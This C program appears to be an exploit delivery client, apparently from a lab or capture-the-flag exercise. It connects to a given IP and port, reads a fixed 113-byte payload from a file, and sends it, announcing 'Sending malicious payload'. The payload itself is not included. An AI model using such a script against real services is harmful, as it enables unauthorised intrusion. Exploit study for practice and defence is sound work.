#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define DEFAULT_FILENAME "passwd.txt"
#define BUFFER_SIZE 2048
#define PAYLOAD_SIZE 113

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s <ip_address> <port> [payload_filename]\n", prog_name);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *ip_address = argv[1];
    int port = atoi(argv[2]);
    const char *filename = (argc >= 4) ? argv[3] : DEFAULT_FILENAME;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return EXIT_FAILURE;
    }

    struct sockaddr_in server_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port)
    };

    if (inet_pton(AF_INET, ip_address, &server_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        close(sock);
        return EXIT_FAILURE;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return EXIT_FAILURE;
    }

    char buffer[BUFFER_SIZE];

    // Receive initial message
    ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received < 0) {
        perror("Initial receive failed");
        close(sock);
        return EXIT_FAILURE;
    }
    buffer[received] = '\0';
    printf("Server: %s\n", buffer);

    // Open payload file
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("Failed to open payload file");
        close(sock);
        return EXIT_FAILURE;
    }

    size_t bytes_read = fread(buffer, 1, sizeof(buffer), file);
    fclose(file);

    if (bytes_read < PAYLOAD_SIZE) {
        fprintf(stderr, "Error: insufficient data in file (read %zu bytes)\n", bytes_read);
        close(sock);
        return EXIT_FAILURE;
    }

    // Send payload
    if (send(sock, buffer, PAYLOAD_SIZE, 0) < 0) {
        perror("Payload send failed");
        close(sock);
        return EXIT_FAILURE;
    }
    printf("Sending malicious payload\n");

    if (shutdown(sock, SHUT_WR) < 0) {
        perror("Failed to shutdown write");
        close(sock);
        return EXIT_FAILURE;
    }

    // Receive final response
    received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received < 0) {
        perror("Final receive failed");
        close(sock);
        return EXIT_FAILURE;
    }
    buffer[received] = '\0';
    printf("Response: %s\n", buffer);

    close(sock);
    return EXIT_SUCCESS;
}
